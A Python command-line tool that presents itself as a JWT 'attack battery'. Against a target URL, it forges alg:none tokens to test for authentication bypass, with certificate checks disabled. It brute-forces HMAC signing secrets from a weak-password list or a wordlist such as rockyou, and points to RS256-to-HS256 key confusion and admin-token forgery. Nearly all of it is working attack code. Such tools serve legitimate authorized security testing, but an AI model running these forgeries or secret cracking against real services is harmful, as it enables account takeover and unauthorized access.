#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
jwt_test.py — JWT analysis + attack battery (stdlib-only)
Usage:
  python jwt_test.py --jwt eyJhbGc... [--url https://target.com/api/me] [--cookie "sid=x"]
                     [--wordlist rockyou.txt]
Actions:
  1. Decode header/payload
  2. Check exp/iat/nbf, weak claims
  3. alg:none forge test (must have --url)
  4. Try common weak secrets (if HS*) + wordlist
  5. RS256→HS256 confusion hint (needs --pubkey for real test)
No-arg = help.
"""
import sys, os, json, base64, hmac, hashlib, time, ssl
import urllib.request, urllib.error
import io
if hasattr(sys.stdout, 'buffer') and sys.stdout.encoding != 'utf-8':
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

UA = "Mozilla/5.0 webtest-jwt/1.0"

def b64u(s):
    s = s.replace("-", "+").replace("_", "/")
    pad = len(s) % 4
    if pad:
        s += "=" * (4 - pad)
    return base64.urlsafe_b64decode(s)

def b64u_encode(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

_HASH_MAP = {
    "HS256": hashlib.sha256,
    "HS384": hashlib.sha384,
    "HS512": hashlib.sha512,
}

def sign(header, payload, secret, alg):
    digest = _HASH_MAP.get(alg)
    if not digest:
        return None
    data = (b64u_encode(header) + "." + b64u_encode(payload)).encode()
    return b64u_encode(hmac.new(secret.encode(), data, digest).digest())

def request(url, token, cookie):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    h = {"User-Agent": UA, "Authorization": "Bearer " + token}
    if cookie:
        h["Cookie"] = cookie
    r = urllib.request.Request(url, headers=h)
    try:
        resp = urllib.request.urlopen(r, timeout=15, context=ctx)
        return resp.status, resp.read(4000).decode(errors="replace")
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read(4000).decode(errors="replace")
        except Exception:
            return e.code, ""
    except Exception as e:
        return None, str(e)[:200]

WEAK = ["secret", "password", "jwt_secret", "key", "private_key", "supersecret",
        "changeme", "123456", "admin", "root", "default", "s3cr3t", "jwt",
        "mysecret", "my_secret", "token", "hackme", "test", "testing", "letmein",
        "qwerty", "iloveyou", "monkey", "dragon", "football", "baseball", "password1"]

def main():
    args = sys.argv[1:]
    if not args or not any(a == "--jwt" for a in args):
        print(__doc__)
        sys.exit(0)
    opts = {}
    i = 0
    while i < len(args):
        if args[i] == "--jwt":
            opts["jwt"] = args[i + 1]; i += 2
        elif args[i] == "--url":
            opts["url"] = args[i + 1]; i += 2
        elif args[i] == "--cookie":
            opts["cookie"] = args[i + 1]; i += 2
        elif args[i] == "--wordlist":
            opts["wordlist"] = args[i + 1]; i += 2
        else:
            i += 1

    tok = opts["jwt"]
    parts = tok.split(".")
    if len(parts) != 3:
        print("[x] not a JWT (need 3 parts)")
        sys.exit(1)

    hdr = json.loads(b64u(parts[0]))
    pay = json.loads(b64u(parts[1]))
    print("=== HEADER ===")
    print(json.dumps(hdr, indent=2))
    print("=== PAYLOAD ===")
    print(json.dumps(pay, indent=2))

    alg = hdr.get("alg", "?")
    print(f"\nalg: {alg}")

    now = int(time.time())
    if "exp" in pay:
        if pay["exp"] < now:
            print("[i] exp already passed (expired token)")
        else:
            print(f"[i] exp in {pay['exp'] - now}s")
    else:
        print("[!!] no exp claim — token never expires")

    claims = ["iss", "aud", "sub", "jti"]
    for c in claims:
        if c not in pay:
            print(f"[i] no {c} claim")

    if "admin" in pay or "role" in pay or "is_admin" in pay:
        print(f"[i] role claims present: { {k: pay[k] for k in pay if k in ('admin','role','is_admin','superuser')} }")

    url = opts.get("url")
    cookie = opts.get("cookie")

    # --- alg:none forge ---
    if url:
        none_header = b64u_encode(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode())
        none_tok = none_header + "." + parts[1] + "."
        st, body = request(url, none_tok, cookie)
        print(f"\n[alg:none] forged token -> status {st}")
        if st and st not in (401, 403):
            print(f"[!!] SERVER ACCEPTED alg:none! CRIT auth bypass. body: {body[:200]}")
        else:
            print("[-] alg:none rejected")

    # --- weak secret brute ---
    if alg.startswith("HS"):
        print(f"\n[*] trying {len(WEAK)} common secrets against {alg}...")
        hdr_b = json.loads(b64u(parts[0]))
        pay_b = json.loads(b64u(parts[1]))
        found = False
        for s in WEAK:
            sig = sign(hdr_b, pay_b, s, alg)
            if sig and sig == parts[2]:
                print(f"[!!] WEAK SECRET FOUND: {s!r} — anyone can forge tokens")
                found = True
                break
        wl = opts.get("wordlist")
        if not found and wl and os.path.exists(wl):
            print(f"[*] trying wordlist {wl}...")
            with open(wl, errors="ignore") as f:
                for line in f:
                    s = line.strip()
                    if not s:
                        continue
                    sig = sign(hdr_b, pay_b, s, alg)
                    if sig and sig == parts[2]:
                        print(f"[!!] SECRET FOUND in wordlist: {s!r}")
                        found = True
                        break
        if not found:
            print("[-] not in common/wordlist secrets")
    else:
        print(f"\n[i] alg {alg} — not HMAC, try RS→HS confusion: re-sign with public key as HMAC secret (needs target public key/cert)")

    # --- forge admin hint ---
    print("\n[*] If secret found, forge admin token:")
    print("    python -c \"see novahaku SKILL.md JWT Forge section\"")

if __name__ == "__main__":
    main()
